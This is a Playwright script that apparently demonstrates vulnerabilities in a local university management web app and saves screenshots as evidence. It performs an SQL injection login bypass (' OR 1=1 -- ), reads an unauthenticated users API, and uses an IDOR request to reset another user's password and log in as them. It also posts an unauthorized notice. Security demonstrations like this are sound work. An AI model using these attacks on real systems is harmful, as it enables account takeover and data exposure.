const fs = require("fs");
const path = require("path");
const { chromium } = require("playwright");

const rootDir = path.resolve(__dirname, "..");
const outputDir = path.join(rootDir, "images", "security");
const resultDir = path.join(rootDir, "evidence");
const frontendBase = "http://localhost:5175";
const backendBase = "http://127.0.0.1:8000";

async function ensureDir(dir) {
  await fs.promises.mkdir(dir, { recursive: true });
}

async function writeJson(name, data) {
  await fs.promises.writeFile(
    path.join(resultDir, name),
    JSON.stringify(data, null, 2),
    "utf8"
  );
}

async function shot(page, name) {
  await page.screenshot({
    path: path.join(outputDir, name),
    fullPage: true,
  });
}

async function showReport(page, title, payload) {
  const body = `
    <html>
      <head>
        <meta charset="utf-8" />
        <title>${title}</title>
        <style>
          body { font-family: Consolas, monospace; background: #0f172a; color: #e2e8f0; padding: 32px; }
          h1 { font-size: 28px; margin-bottom: 16px; }
          pre { white-space: pre-wrap; word-break: break-word; background: #111827; padding: 20px; border-radius: 12px; border: 1px solid #334155; }
        </style>
      </head>
      <body>
        <h1>${title}</h1>
        <pre>${JSON.stringify(payload, null, 2)}</pre>
      </body>
    </html>
  `;
  await page.setContent(body, { waitUntil: "load" });
}

async function main() {
  await ensureDir(outputDir);
  await ensureDir(resultDir);

  const browser = await chromium.launch({
    channel: "chrome",
    headless: true,
  });
  const page = await browser.newPage({
    viewport: { width: 1440, height: 1080 },
  });

  await page.goto(`${frontendBase}/login`, { waitUntil: "domcontentloaded" });
  await page.waitForTimeout(2000);
  await page.locator("input").nth(0).fill("' OR 1=1 -- ");
  await page.locator("input").nth(1).fill("x");
  await shot(page, "01-login-sqli-payload.png");
  await page.getByRole("button", { name: "进入系统" }).click();
  await page.waitForURL("**/admin/dashboard");
  await shot(page, "02-login-bypass-dashboard.png");

  await page.goto(`${frontendBase}/admin/users`, { waitUntil: "networkidle" });
  await shot(page, "03-admin-users-passwords.png");

  await page.goto(`${backendBase}/api/users`, { waitUntil: "networkidle" });
  await shot(page, "04-unauthenticated-users-api.png");

  await page.goto(`${frontendBase}/`, { waitUntil: "domcontentloaded" });
  await page.evaluate(() => localStorage.clear());
  await page.goto(`${frontendBase}/login`, { waitUntil: "domcontentloaded" });
  await page.waitForTimeout(2000);
  await page.locator("input").nth(0).fill("user02");
  await page.locator("input").nth(1).fill("123456");
  await page.getByRole("button", { name: "进入系统" }).click();
  await page.waitForURL("**/user/home");

  const privilegeEscalation = await page.evaluate(async ({ backendBase }) => {
    const updateBody = {
      name: "张同学",
      phone: "13800009999",
      email: "hijacked@uniman.local",
      department: "计算机学院",
      password: "hacked456",
    };

    const updateResponse = await fetch(`${backendBase}/api/profile/4`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(updateBody),
    });
    const updateResult = await updateResponse.json();

    const loginResponse = await fetch(`${backendBase}/api/auth/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "user01",
        password: "hacked456",
      }),
    });
    const loginResult = await loginResponse.json();

    const noticeResponse = await fetch(`${backendBase}/api/notices`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        title: "未授权公告",
        content: "普通攻击者直接写入公告。",
        status: "已发布",
        publish_scope: "全校",
        publisher_id: 5,
        publisher_name: "李同学",
      }),
    });
    const noticeResult = await noticeResponse.json();

    return {
      attack: "user02 越权修改 user01 资料并重置其密码，随后直接创建公告",
      update_status: updateResponse.status,
      update_result: updateResult,
      login_status: loginResponse.status,
      login_result: loginResult,
      notice_status: noticeResponse.status,
      notice_result: noticeResult,
    };
  }, { backendBase });

  await writeJson("with-vuln-privilege-escalation.json", privilegeEscalation);
  await showReport(page, "越权与未鉴权攻击结果", privilegeEscalation);
  await shot(page, "05-privilege-escalation-report.png");

  await page.evaluate(async ({ backendBase }) => {
    await fetch(`${backendBase}/api/profile/4`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        name: "张同学",
        phone: "13800000021",
        email: "user01@uniman.local",
        department: "计算机学院",
        password: "123456",
      }),
    });
  }, { backendBase });

  await browser.close();
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
